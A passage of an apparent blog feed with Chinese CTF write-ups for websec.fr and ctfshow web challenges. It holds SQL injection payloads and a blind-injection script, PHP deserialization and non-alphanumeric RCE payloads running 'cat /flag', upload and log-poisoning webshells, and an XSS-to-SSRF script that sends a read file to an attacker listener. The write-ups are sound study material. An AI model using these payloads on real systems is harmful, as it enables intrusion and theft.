class="hljs-keyword">Table</span> definitionThe <span class="hljs-keyword">table</span> definition <span class="hljs-keyword">is</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">follows</span>:<span class="hljs-keyword">Type</span> : <span class="hljs-keyword">Type</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">Index</span> <span class="hljs-keyword">or</span> Table.<span class="hljs-keyword">name</span> : <span class="hljs-keyword">Index</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">name</span>tbl_name : <span class="hljs-keyword">Name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">table</span>rootpage : rootpage, internal <span class="hljs-keyword">to</span> SQLite<span class="hljs-keyword">sql</span> : The <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">statement</span>, which would <span class="hljs-keyword">create</span> this table. Example:     <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> [table2] ([t2c1] <span class="hljs-built_in">VARCHAR</span>, [t2c2] <span class="hljs-built_in">VARCHAR</span>, <span class="hljs-keyword">CONSTRAINT</span> <span class="hljs-string">&quot;p_key&quot;</span> PRIMARY <span class="hljs-keyword">KEY</span> ([t2c1], [t2c2]) <span class="hljs-keyword">ON</span> CONFLICT <span class="hljs-keyword">ABORT</span>)</code></pre><h1 id="level04"><a href="#level04" class="headerlink" title="level04"></a>level04</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// leet_hax0r cookie</span><span class="hljs-variable">$cookie</span> = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// &lt;-- Your cookie here</span><span class="hljs-variable">$cookie</span> = unserialize (base64_decode (<span class="hljs-variable">$cookie</span>));<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$cookie</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span> </span>&#123;    <span class="hljs-comment">//SELECT * FROM users;  SELECT password AS username FROM users;</span>    <span class="hljs-comment">//SELECT sql AS username FROM sqlite_master WHERE type!=&#x27;meta&#x27; AND sql NOT NULL;</span>    <span class="hljs-comment">// -&gt; CREATE TABLE users(id int, username varchar, password varchar)</span>    <span class="hljs-comment">//</span>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT password AS username FROM users;&#x27;</span>;    <span class="hljs-comment">// -&gt; WEBSEC&#123;9abd8e8247cbe62641ff662e8fbb662769c08500&#125;</span>&#125;<span class="hljs-variable">$obj</span> = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ip&#x27;</span>=&gt;<span class="hljs-variable">$ip</span>, <span class="hljs-string">&#x27;sql&#x27;</span>=&gt;<span class="hljs-keyword">new</span> SQL()));<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span> . <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$obj</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">#####################</span>cookie不设置也没事没有<span class="hljs-keyword">die</span>  connect.php页面，照样会打印出为什么要<span class="hljs-keyword">AS</span> username 呢，因为 <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; &#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;只会显示Username的结果</code></pre><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><p>数组绕 strcasecmp</p><p>#level25</p><p>parse_url报错返回flase 绕过检测</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>websec.fr<span class="hljs-regexp">//</span><span class="hljs-regexp">/level25/i</span>ndex.php?page=flag或则http:<span class="hljs-regexp">//</span>websec.fr<span class="hljs-regexp">/level25/i</span>ndex.php?page=flag&amp;:<span class="hljs-number">0</span></code></pre><h1 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h1><p>利用1s的sleep读文件</p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>双写绕</p><pre><code class="hljs pgsql"><span class="hljs-number">-2</span> uunionnion seleselectct <span class="hljs-number">5</span>,(seselectlect grogroupup_concat(<span class="hljs-keyword">password</span>) ffromrom users)<span class="hljs-comment">-- +</span></code></pre><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>emm 直接传GIF89a<br><?php show_source("./flag.txt");?></p><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p>弱类型强行暴破</p><p>#level11</p><pre><code class="hljs sqlite">(SELECT 2 id, enemy username FROM costume where id LIKE 1)SELECT id,username FROM (SELECT 2 id, enemy username FROM costume where id LIKE 1) WHERE id &#x3D; 2SELECT id,username FROM (SELECT 2 AS id, enemy AS username FROM costume where id LIKE 1) WHERE id &#x3D; 2</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>websec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow</title>
    <link href="/2020/05/02/ctfshow/"/>
    <url>/2020/05/02/ctfshow/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h2><pre><code class="hljs routeros"><span class="hljs-attribute">code</span>=<span class="hljs-string">&#x27;123&#x27;</span>);$_=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-variable">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);#&amp;<span class="hljs-attribute">_</span>=system(&#x27;cat /flag<span class="hljs-string">&#x27;);</span></code></pre><h2 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h2><p>第一层 爆破弱类型115</p><p>第二层</p><pre><code class="hljs mel">/w3b5HeLLlll123.php?code=]=<span class="hljs-number">123</span>?&gt;&lt;?=require@~%d0%99%93%9e%98?&gt;</code></pre><h2 id="WEB-RemoteImageDownloader"><a href="#WEB-RemoteImageDownloader" class="headerlink" title="WEB_RemoteImageDownloader"></a>WEB_RemoteImageDownloader</h2><p><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</a></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./1.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqListener</span> (<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> encoded = <span class="hljs-built_in">encodeURI</span>(<span class="hljs-built_in">this</span>.responseText);    <span class="hljs-keyword">var</span> b64 = btoa(<span class="hljs-built_in">this</span>.responseText);    <span class="hljs-keyword">var</span> raw = <span class="hljs-built_in">this</span>.responseText;    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;iframe src=&quot;http://ip/?data=&#x27;</span>+b64+<span class="hljs-string">&#x27;&quot;&gt;&lt;/iframe&gt;&#x27;</span>);&#125; <span class="hljs-keyword">var</span> oReq = <span class="hljs-keyword">new</span> XMLHttpRequest(); oReq.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reqListener); oReq.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;file:///flag&quot;</span>); oReq.send();</code></pre><p>监听下4010端口，拿<a href="http://120.24.42.229:4003/1.html">http://120.24.42.229:4003/1.html</a>  去下载下 就能看到返回的flag</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?data=ZmxhZ<span class="hljs-number">3</span>tmYjRlNDgyOC<span class="hljs-number">1</span>hOTliLTQwNTUtYmE<span class="hljs-number">3</span>ZS<span class="hljs-number">1</span>kOWRjNTMzNjZiZDZ<span class="hljs-number">9</span>Cg== HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">120.24.42.229:4003</span>/<span class="hljs-number">1</span>.html<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Unknown; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">538</span>.<span class="hljs-number">1</span> (KHTML, like Gecko) PhantomJS/<span class="hljs-number">2</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> Safari/<span class="hljs-number">538</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Connection</span>: Keep-Alive<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Accept</span>-Language: en,*<span class="hljs-attribute">Host</span>: <span class="hljs-number">120.24.42.229:4010</span></code></pre><h2 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h2><p>/var/log/nginx/access.log 包含shell</p><p>find /etc  -type f |xargs grep “flag{“  找flag</p><h2 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h2><pre><code class="hljs routeros"><span class="hljs-comment"># regexp注入 binary可以判断大小写</span> import requestsimport timeurl = <span class="hljs-string">&#x27;https://bf661d3a-5bb3-4165-8b30-1c11f4a714d5.chall.ctf.show/index.php&#x27;</span>payload = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;admin\\&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;str = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;admin\\&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;<span class="hljs-comment"># print(requests.post(url,data=payload).text)</span><span class="hljs-attribute">x</span>=<span class="hljs-string">&quot;&quot;</span>zfc = [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;X&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> range(1,50):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> zfc:        # <span class="hljs-attribute">i</span>=<span class="hljs-string">&quot;a&quot;</span>        str[<span class="hljs-string">&#x27;password&#x27;</span>]=<span class="hljs-string">&#x27;or/**/if(password/**/regexp/**/binary/**/&quot;^&#123;&#125;&quot;,sleep(2),1)#&#x27;</span>.format(x+i)        time.sleep(0.1)        # <span class="hljs-builtin-name">print</span>(str)        # <span class="hljs-builtin-name">print</span>(requests.post(url,<span class="hljs-attribute">data</span>=str).status_code)        before_time = time.time()        r = requests.post(url, <span class="hljs-attribute">data</span>=str)        after_time = time.time()        offset = after_time - before_time        # <span class="hljs-builtin-name">print</span>(offset)        <span class="hljs-keyword">if</span> offset &gt;2:            <span class="hljs-attribute">x</span>=x+i            <span class="hljs-builtin-name">print</span>(x)            break</code></pre><h2 id="WEB-WUSTCTF朴实无华-Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华-Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华_Revenge_Revenge"></a>WEB_WUSTCTF朴实无华_Revenge_Revenge</h2><p>/?num=.0&amp;md5=0e1138100474&amp;get_flag=ca\t%09flag.ph\p</p><h2 id="WEB-你没见过的注入"><a href="#WEB-你没见过的注入" class="headerlink" title="WEB_你没见过的注入"></a>WEB_你没见过的注入</h2><p>上传文件的时候存入了文件的信息，而且没做过滤，直接报错注入读 /flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LFI2019</title>
    <link href="/2020/04/30/LFI2019/"/>
    <url>/2020/04/30/LFI2019/</url>
    
    <content type="html"><![CDATA[<h1 id="绕文件名的限制"><a href="#绕文件名的限制" class="headerlink" title="绕文件名的限制"></a>绕文件名的限制</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;filename = path_sanitizer(<span class="hljs-variable">$filename</span>);        &#125;<span class="hljs-variable">$read_file</span> = <span class="hljs-string">&quot;./files/&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename;<span class="hljs-variable">$read_file_with_hardened_filter</span> = <span class="hljs-string">&quot;./files/&quot;</span> . path_sanitizer(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-literal">true</span>); <span class="hljs-keyword">if</span>(<span class="hljs-variable">$read_file</span> === <span class="hljs-variable">$read_file_with_hardened_filter</span> ||@file_get_contents(<span class="hljs-variable">$read_file</span>) === @file_get_contents(<span class="hljs-variable">$read_file_with_hardened_filter</span>))&#123;<span class="hljs-keyword">return</span> [<span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;request blocked&quot;</span>, <span class="hljs-string">&quot;type&quot;</span> =&gt; <span class="hljs-string">&quot;error&quot;</span>];&#125;</code></pre><p>题目是在Windows下,有两种方法绕过对文件名的限制</p><pre><code class="hljs stata">1.<span class="hljs-keyword">shell</span>&quot;php === <span class="hljs-keyword">shell</span>.php<span class="hljs-comment">//true</span>2.<span class="hljs-keyword">test</span>::<span class="hljs-variable">$INDEX_ALLOCATION</span>  会建一个<span class="hljs-keyword">test</span>文件，然后在<span class="hljs-keyword">test</span>下写文件就能绕过</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2019/png/298354/1572187075689-2a8c066f-5c30-4f23-9f1f-fd564d4f87f1.png"></p><h1 id="无字符rce"><a href="#无字符rce" class="headerlink" title="无字符rce"></a>无字符rce</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[(<span class="hljs-string">&quot;!&quot;</span>==<span class="hljs-string">&quot;!&quot;</span>)+(<span class="hljs-string">&quot;!&quot;</span>==<span class="hljs-string">&quot;!&quot;</span>)+(<span class="hljs-string">&quot;!&quot;</span>==<span class="hljs-string">&quot;!&quot;</span>)];<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$__</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$____</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>;<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$__</span>.<span class="hljs-variable">$___</span>.<span class="hljs-variable">$____</span>.<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$___</span>++;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$______</span>++;<span class="hljs-variable">$___</span>=<span class="hljs-variable">$___</span>.<span class="hljs-variable">$____</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>;<span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$____</span>++;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$_____</span>++;<span class="hljs-variable">$___</span>=<span class="hljs-variable">$___</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$____</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$____</span>;<span class="hljs-variable">$__</span>(<span class="hljs-variable">$___</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment"># readfile(&#x27;flag.php&#x27;);</span></code></pre><p><a 